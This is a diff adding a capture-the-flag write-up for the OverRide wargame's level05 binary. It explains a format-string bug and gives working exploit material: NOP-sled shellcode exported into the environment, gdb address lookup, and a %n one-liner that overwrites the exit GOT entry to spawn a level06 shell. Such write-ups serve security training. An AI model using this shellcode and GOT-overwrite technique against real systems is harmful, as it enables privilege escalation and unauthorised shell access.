@@ -1,0 +1,40 @@
+For this exercise we have a binary which reads on stdin :
+
+level05@OverRide:~$ ./level05
+Hello There
+hello there
+level05@OverRide:~$
+
+
+The input is transformed into lowercase.
+
+Opening gdb we can see a call to printf and it's vulnerable to the format string.
+
+We can find the offset on which we can write.
+This offset is the 10th.
+Just after printf, exit is called.
+Using the format string we can overwrite exit GOT address with one we can control.
+To do that we will add a shellcode into the environment.
+
+export EXPLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
+
+We can find the address of EXPLCODE with gdb :
+
+(gdb) x/s *((char **)environ)
+...
+(gdb)
+0xffffdeaf:	 "EXPLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061۰\006̀Sh/ttyh/dev\211\343\061\311f\271\022'\260\005̀1\300Ph//shh/bin\211\343PS\211ᙰ\v̀"
+
+Our shellcode is located at 0xffffdeaf.
+
+We need to overwrite exit (0x080497e0) to EXPLCODE (0xffffdeaf).
+
+We can write with one integer so we need to split the address of exit by 2.
+
+0x080497e0 and 0x080497e2 (exit + 2).
+
+We can look for the padding and the final result is :
+
+level05@OverRide:~$ python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56999x" + "%10$n" + "%74064x" + "%11$n"' | ./level05
+
+This launch a new shell as level06.
